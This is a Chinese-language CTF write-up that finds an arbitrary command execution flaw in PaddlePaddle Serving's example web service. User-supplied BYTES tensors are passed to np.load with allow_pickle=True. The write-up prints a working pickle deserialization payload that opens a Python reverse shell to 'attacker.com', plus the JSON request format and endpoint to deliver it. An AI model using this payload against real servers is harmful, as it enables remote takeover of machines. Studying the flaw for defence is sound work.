# 题目描述

Flexible to serve ML models, and more.

# 解决方案

这里直接使用paddle框架提供的一个示例程序来开启服务，配置都是官方提供的，不做任何更改，事实证明是存在任意命令执行漏洞的。

首先，这个问题需要从[paddle_serving_server](https://github.com/PaddlePaddle/Serving/tree/v0.9.0/python/paddle_serving_server)中去找漏洞，先跟到WebService类，发现如下函数：

```python
    def prepare_pipeline_config(self, yml_file=None, yml_dict=None):
        # build dag
        read_op = pipeline.RequestOp()
        last_op = self.get_pipeline_response(read_op)
        if not isinstance(last_op, Op):
            raise ValueError("The return value type of `get_pipeline_response` "
                             "function is not Op type, please check function "
                             "`get_pipeline_response`.")
        response_op = pipeline.ResponseOp(input_ops=[last_op])
        self._server.set_response_op(response_op)
        self._server.prepare_server(yml_file=yml_file, yml_dict=yml_dict)
```

然后看pipeline的第一步RequestOp，其文档注释如下：

```
    RequestOp is a special Op, for unpacking one request package. If the
    request needs one special unpackaging method, you need to inherit class
    RequestOp and rewrite function unpack_request_package.Notice!!! Class
    RequestOp does not run preprocess, process, postprocess.
```

这个是处理用户传输的数据的，发现函数proto_tensor_2_numpy有如下处理逻辑：

```python
        np_data = None
        _LOGGER.info("proto_to_numpy, name:{}, type:{}, dims:{}".format(
            tensor.name, tensor.elem_type, dims))
        if tensor.elem_type == 0:
            # VarType: INT64
            np_data = np.array(tensor.int64_data).astype(int64).reshape(dims)
        elif tensor.elem_type == 1:
            # VarType: FP32
            np_data = np.array(tensor.float_data).astype(float32).reshape(dims)
        elif tensor.elem_type == 2:
            # VarType: INT32
            np_data = np.array(tensor.int_data).astype(int32).reshape(dims)
        elif tensor.elem_type == 3:
            # VarType: FP64
            np_data = np.array(tensor.float64_data).astype(float64).reshape(
                dims)
        elif tensor.elem_type == 4:
            # VarType: INT16
            np_data = np.array(tensor.int_data).astype(int16).reshape(dims)
        elif tensor.elem_type == 5:
            # VarType: FP16
            np_data = np.array(tensor.float_data).astype(float16).reshape(dims)
        elif tensor.elem_type == 6:
            # VarType: BF16
            np_data = np.array(tensor.uint32_data).astype(uint16).reshape(dims)
        elif tensor.elem_type == 7:
            # VarType: UINT8
            np_data = np.array(tensor.uint32_data).astype(uint8).reshape(dims)
        elif tensor.elem_type == 8:
            # VarType: INT8
            np_data = np.array(tensor.int_data).astype(int8).reshape(dims)
        elif tensor.elem_type == 9:
            # VarType: BOOL
            np_data = np.array(tensor.bool_data).astype(bool).reshape(dims)
        elif tensor.elem_type == 13:
            # VarType: BYTES
            print(tensor.byte_data)
            byte_data = BytesIO(tensor.byte_data)
            np_data = np.load(byte_data, allow_pickle=True)
        else:
            _LOGGER.error("Sorry, the type {} of tensor {} is not supported.".
                          format(tensor.elem_type, tensor.name))
            raise ValueError(
                "Sorry, the type {} of tensor {} is not supported.".format(
                    tensor.elem_type, tensor.name))
```

看到np.load函数，且allow_pickle为True，[numpy文档](https://numpy.org/doc/stable/reference/generated/numpy.load.html)里已经明确指出allow_pickle为True是有风险的，到这里我们就可以开始构造攻击载荷了，如下：

```python
import pickle
import base64

reverse_shell = """export RHOST="attacker.com";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(reverse_shell,))

print(base64.b64encode(pickle.dumps(PickleRce())))
```

写入的base64会被解码，但是我在源码中找了半天没有找到解码的语句，不过json不能传字节，必须编码成字符，自然想到尝试base64编码。

然后根据proto_tensor_2_numpy知道我们需要传送的数据格式，如下：

```json
{
    "tensors": [
        {
            "name": ":psyduck:",
            "elem_type": 13,
            "byte_data": "pickled data"
        }
    ]
}
```

pickled data为我们构造的攻击载荷，直接POST请求接口`http://127.0.0.1:18082/uci/prediction`，带上json数据，即能成功执行我们想要执行的命令。
